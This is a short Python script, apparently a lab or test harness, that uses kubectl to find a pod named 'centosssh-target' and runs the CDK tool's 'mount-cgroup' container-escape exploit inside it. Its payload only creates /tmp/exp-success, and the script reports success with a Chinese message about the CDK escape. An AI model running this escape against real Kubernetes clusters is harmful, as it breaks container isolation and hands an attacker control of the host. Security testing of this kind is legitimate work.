import subprocess


# 这个方法用来获取centos的pod名称
def exec_cdk_process():
    get_pods_command = ["kubectl", "get", "pod", "-n", "xinfan"]
    process = subprocess.Popen(get_pods_command, stdout=subprocess.PIPE)
    output, error = process.communicate()

    if error:
        print(">>Error occurred:", error)
        return

    pod_name = None
    for line in output.decode().split('\n'):
        if line.split()[0].startswith("centosssh-target"):
            pod_name = line.split()[0]
            break

    if not pod_name:
        print(">>No pod found with 'centosssh-target' in its name")
        return

    exec_command = ["kubectl", "exec", pod_name, "-n", "xinfan", "--", "./cdk", "run", "mount-cgroup",
                    "\"touch /tmp/exp-success\""]
    print(f"\033[92m>>执行命令{' '.join(exec_command)}\033[0m")
    process = subprocess.Popen(exec_command, stdout=subprocess.PIPE)
    output, error = process.communicate()
    if error:
        print(">>Error occurred:", error)
        return
    else:
        print(f"\033[92m>>在pod中成功执行了CDK逃逸命令\033[0m")
        return


